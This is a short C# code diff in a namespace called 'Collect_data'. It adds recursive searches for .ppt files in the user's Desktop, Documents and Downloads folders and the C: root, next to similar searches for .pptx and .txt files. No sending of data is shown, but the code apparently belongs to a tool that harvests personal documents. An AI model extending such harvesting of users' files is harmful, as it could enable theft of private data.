@@ -36,6 +36,11 @@ namespace Collect_data
         public static string[] files_pptx_downloads = Directory.GetFiles(downloads, "*.pptx", SearchOption.AllDirectories);
         public static string[] files_pptx_C = Directory.GetFiles(C, "*.pptx");
 
+        public static string[] files_ppt_desktop = Directory.GetFiles(desktop, "*.ppt", SearchOption.AllDirectories);
+        public static string[] files_ppt_documets = Directory.GetFiles(documents, "*.ppt", SearchOption.AllDirectories);
+        public static string[] files_ppt_downloads = Directory.GetFiles(downloads, "*.ppt", SearchOption.AllDirectories);
+        public static string[] files_ppt_C = Directory.GetFiles(C, "*.ppt");
+
         public static string[] files_txt_desktop = Directory.GetFiles(desktop, "*.txt", SearchOption.AllDirectories);
         public static string[] files_txt_documets = Directory.GetFiles(documents, "*.txt", SearchOption.AllDirectories);
         public static string[] files_txt_downloads = Directory.GetFiles(downloads, "*.txt", SearchOption.AllDirectories);
